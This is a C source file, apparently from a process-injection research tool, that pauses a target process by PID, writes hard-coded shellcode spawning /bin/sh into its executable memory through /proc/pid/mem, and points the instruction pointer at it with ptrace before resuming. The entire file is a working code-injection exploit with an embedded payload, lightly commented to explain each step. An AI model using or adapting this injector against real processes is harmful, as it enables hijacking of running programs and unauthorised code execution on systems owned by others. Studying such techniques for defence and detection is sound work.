#include "../src/procfs_utils.h"
#include "../src/procfs_primitives.h"
#include "../src/ptrace_primitives.h"


// http://shell-storm.org/shellcode/files/shellcode-806.php
// we prefix our shellcode with 2 nops because we use ptrace to modify RIP. 
// for more info on this, please refer to our blog
char *SHELLCODE = "\x90\x90"
                  "\x31\xc0\x48\xbb\xd1\x9d\x96"
                  "\x91\xd0\x8c\x97\xff\x48\xf7"
                  "\xdb\x53\x54\x5f\x99\x52\x57"
                  "\x54\x5e\xb0\x3b\x0f\x05";



int main(int argc, const char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage:\n\t./inject PID\n\n"
                "\tPID - PID of the process to inject code.\n");
        exit(EXIT_FAILURE);
    }

    long pid = strtol(argv[1], (char **) NULL, 10);
    
    // SIGSTOP will deteach the target process from the terminal
    // To re-attach after injection, use the: "reptyr <pid>" command
    kill(pid, SIGSTOP);
    
    // Find executable address in the process address space by parsing the maps file
    long address = procfs_find_executable_region_start_address(pid);
    
    // Use procfs to write to the executable memory
    procfs_proc_mem_write(address, pid, SHELLCODE);
    
    // Use ptrace SETREGS to point RIP to our code
    ptrace_setregs_exec(pid,address,false);

    kill(pid, SIGCONT);

    return 0;
}
